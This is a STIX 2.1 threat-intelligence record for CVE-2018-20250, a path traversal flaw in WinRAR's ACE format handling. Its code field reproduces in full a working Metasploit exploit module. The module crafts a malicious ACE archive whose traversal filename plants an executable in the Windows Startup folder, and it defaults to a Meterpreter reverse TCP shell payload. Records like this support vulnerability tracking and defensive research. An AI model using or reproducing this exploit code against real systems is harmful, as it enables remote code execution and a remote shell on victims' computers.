{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--94ce69a7-77a9-4777-befd-b44b79fc74a9",
    "created": "2024-08-14T16:38:18.993679Z",
    "modified": "2024-08-14T16:38:18.993683Z",
    "name": "RARLAB WinRAR ACE Format Input Validation Remote Code Execution",
    "description": " In WinRAR versions prior to and including 5.61, there is path traversal vulnerability when crafting the filename field of the ACE format (in UNACEV2.dll). When the filename field is manipulated with specific patterns, the destination (extraction) folder is ignored, thus treating the filename as an absolute path. This module will attempt to extract a payload to the startup folder of the current user. It is limited such that we can only go back one folder. Therefore, for this exploit to work properly, the user must extract the supplied RAR file from one folder within the user profile folder (e.g. Desktop or Downloads). User restart is required to gain a shell.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/winrar_ace.rb",
            "external_id": "winrar_ace.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-20250"
        },
        {
            "source_name": "reference",
            "url": "https://research.checkpoint.com/extracting-code-execution-from-winrar/"
        },
        {
            "source_name": "reference",
            "url": "https://apidoc.roe.ch/acefile/latest/"
        },
        {
            "source_name": "reference",
            "url": "http://www.hugi.scene.org/online/coding/hugi%2012%20-%20coace.htm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n#\n# TODO: add other non-payload files\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RARLAB WinRAR ACE Format Input Validation Remote Code Execution',\n      'Description'    => %q{\n        In WinRAR versions prior to and including 5.61, there is path traversal vulnerability\n        when crafting the filename field of the ACE format (in UNACEV2.dll). When the filename\n        field is manipulated with specific patterns, the destination (extraction) folder is\n        ignored, thus treating the filename as an absolute path. This module will attempt to\n        extract a payload to the startup folder of the current user. It is limited such that\n        we can only go back one folder. Therefore, for this exploit to work properly, the user\n        must extract the supplied RAR file from one folder within the user profile folder\n        (e.g. Desktop or Downloads). User restart is required to gain a shell.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nadav Grossman', # exploit discovery\n          'Imran E. Dawoodjee <imrandawoodjee.infosec@gmail.com>' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2018-20250'],\n          ['EDB', '46552'],\n          ['BID', '106948'],\n          ['URL', 'https://research.checkpoint.com/extracting-code-execution-from-winrar/'],\n          ['URL', 'https://apidoc.roe.ch/acefile/latest/'],\n          ['URL', 'http://www.hugi.scene.org/online/coding/hugi%2012%20-%20coace.htm'],\n        ],\n      'Platform'       => 'win',\n      'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' },\n      'Targets'        =>\n        [\n          [ 'RARLAB WinRAR <= 5.61', {} ]\n        ],\n      'DisclosureDate' => '2019-02-05',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The output file name.', 'msf.ace']),\n        OptString.new('CUSTFILE', [ false, 'User-defined custom payload', '']),\n        OptString.new('FILE_LIST', [false, 'List of other non-payload files to add', ''])\n      ])\n\n  end\n\n  def exploit\n    ace_header = \"\"\n    # All hex values are already in little endian.\n    # HEAD_CRC: Lower 2 bytes of CRC32 of 49 bytes of header after HEAD_TYPE.\n    # The bogus value for HEAD_CRC will be replaced later.\n    ace_header << \"AA\"\n    # HEAD_SIZE: header size. \\x31\\x00 says 49.\n    ace_header << \"\\x31\\x00\"\n    # HEAD_TYPE: header type. Archive header is 0.\n    ace_header << \"\\x00\"\n    # HEAD_FLAGS: header flags\n    ace_header << \"\\x00\\x90\"\n    # ACE magic\n    ace_header << \"\\x2A\\x2A\\x41\\x43\\x45\\x2A\\x2A\"\n    # VER_EXTRACT: version needed to extract archive\n    ace_header << \"\\x14\"\n    # VER_CREATED: version used to create archive\n    ace_header << \"\\x14\"\n    # HOST_CREATED: host OS for ACE used to create archive\n    ace_header << \"\\x02\"\n    # VOLUME_NUM: which volume of a multi-volume archive?\n    ace_header << \"\\x00\"\n    # TIME_CREATED: date and time in MS-DOS format\n    ace_header << \"\\x10\\x18\\x56\\x4E\"\n    # RESERVED1\n    ace_header << \"\\x97\\x4F\\xF6\\xAA\\x00\\x00\\x00\\x00\"\n    # AV_SIZE: advert size\n    ace_header << \"\\x16\"\n    # AV: advert which shows if registered/unregistered.\n    # Full advert says \"*UNREGISTERED VERSION*\"\n    ace_header << \"\\x2A\\x55\\x4E\\x52\\x45\\x47\\x49\\x53\\x54\\x45\\x52\\x45\\x44\\x20\\x56\\x45\\x52\\x53\\x49\\x4F\\x4E\\x2A\"\n\n    # calculate the CRC32 of ACE header, and get the lower 2 bytes\n    ace_header_crc32 = crc32(ace_header[4, ace_header.length]).to_s(16)\n    ace_header_crc16 = ace_header_crc32.last(4).to_i(base=16)\n    ace_header[0,2] = [ace_header_crc16].pack(\"v\")\n\n    # start putting the ACE file together\n    ace_file = \"\"\n    ace_file << ace_header\n\n    # create headers and append file data after header\n    unless datastore[\"FILE_LIST\"].empty?\n      print_status(\"Using the provided list of files @ #{datastore[\"FILE_LIST\"]}...\")\n      File.binread(datastore[\"FILE_LIST\"]).each_line do |file|\n        file = file.chomp\n        file_header_and_data = create_file_header_and_data(file, false, false)\n        ace_file << file_header_and_data\n      end\n    end\n\n    # autogenerated payload\n    if datastore[\"CUSTFILE\"].empty?\n      payload_filename = \"\"\n      # 72 characters\n      payload_filename << \"C:\\\\C:C:../AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n      # 6 characters\n      payload_filename << rand_text_alpha(6)\n      # 4 characters\n      payload_filename << \".exe\"\n      payload_file_header = create_file_header_and_data(payload_filename, true, false)\n    # user-defined payload\n    else\n      print_status(\"Using a custom payload: #{::File.basename(datastore[\"CUSTFILE\"])}\")\n      payload_filename = \"\"\n      # 72 characters\n      payload_filename << \"C:\\\\C:C:../AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n      # n characters\n      payload_filename << ::File.basename(datastore[\"CUSTFILE\"])\n      payload_file_header = create_file_header_and_data(payload_filename, true, true)\n    end\n\n    vprint_status(\"Payload filename: #{payload_filename.from(72)}\")\n\n    # append payload file header and the payload itself into the rest of the data\n    ace_file << payload_file_header\n    # create the file\n    file_create(ace_file)\n  end\n\n  # The CRC implementation used in ACE does not take the last step in calculating CRC32.\n  # That is, it does not flip the bits. Therefore, it can be easily calculated by taking\n  # the negative bitwise OR of the usual CRC and then subtracting one from it. This is due to\n  # the way the bitwise OR works in Ruby: unsigned integers are not a thing in Ruby, so\n  # applying a bitwise OR on an integer will produce its negative + 1.\n  def crc32(data)\n    table = Zlib.crc_table\n    crc = 0xffffffff\n    data.unpack('C*').each { |b|\n      crc = table[(crc & 0xff) ^ b] ^ (crc >> 8)\n    }\n    -(~crc) - 1\n  end\n\n  # create file headers for each file to put into the output ACE file\n  def create_file_header_and_data(path, is_payload, is_custom_payload)\n    #print_status(\"Length of #{path}: #{path.length}\")\n    if is_payload and is_custom_payload\n      file_data = File.binread(path.from(72))\n    elsif is_payload and !is_custom_payload\n      file_data = generate_payload_exe\n    else\n      file_data = File.binread(File.basename(path))\n    end\n\n    file_data_crc32 = crc32(file_data).to_i\n\n    # HEAD_CRC: Lower 2 bytes of CRC32 of the next bytes of header after HEAD_TYPE.\n    # The bogus value for HEAD_CRC will be replaced later.\n    file_header = \"\"\n    file_header << \"AA\"\n    # HEAD_SIZE: file header size.\n    if is_payload\n      file_header << [31 + path.length].pack(\"v\")\n    else\n      file_header << [31 + ::File.basename(path).length].pack(\"v\")\n    end\n    # HEAD_TYPE: header type is 1.\n    file_header << \"\\x01\"\n    # HEAD_FLAGS: header flags. \\x01\\x80 is ADDSIZE|SOLID.\n    file_header << \"\\x01\\x80\"\n    # PACK_SIZE: size when packed.\n    file_header << [file_data.length].pack(\"V\")\n    #print_status(\"#{file_data.length}\")\n    # ORIG_SIZE: original size. Same as PACK_SIZE since no compression is *truly* taking place.\n    file_header << [file_data.length].pack(\"V\")\n    # FTIME: file date and time in MS-DOS format\n    file_header << \"\\x63\\xB0\\x55\\x4E\"\n    # ATTR: DOS/Windows file attribute bit field, as int, as produced by the Windows GetFileAttributes() API.\n    file_header << \"\\x20\\x00\\x00\\x00\"\n    # CRC32: CRC32 of the compressed file\n    file_header << [file_data_crc32].pack(\"V\")\n    # Compression type\n    file_header << \"\\x00\"\n    # Compression quality\n    file_header << \"\\x03\"\n    # Parameter for decompression\n    file_header << \"\\x0A\\x00\"\n    # RESERVED1\n    file_header << \"\\x54\\x45\"\n    # FNAME_SIZE: size of filename string\n    if is_payload\n      file_header << [path.length].pack(\"v\")\n    else\n      # print_status(\"#{::File.basename(path).length}\")\n      file_header << [::File.basename(path).length].pack(\"v\")\n    end\n    #file_header << [path.length].pack(\"v\")\n    # FNAME: filename string. Empty for now. Fill in later.\n    if is_payload\n      file_header << path\n    else\n      file_header << ::File.basename(path)\n    end\n\n    #print_status(\"Calculating other_file_header...\")\n    file_header_crc32 = crc32(file_header[4, file_header.length]).to_s(16)\n    file_header_crc16 = file_header_crc32.last(4).to_i(base=16)\n    file_header[0,2] = [file_header_crc16].pack(\"v\")\n    file_header << file_data\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-02-05",
    "x_mitre_platforms": [
        "win'"
    ]
}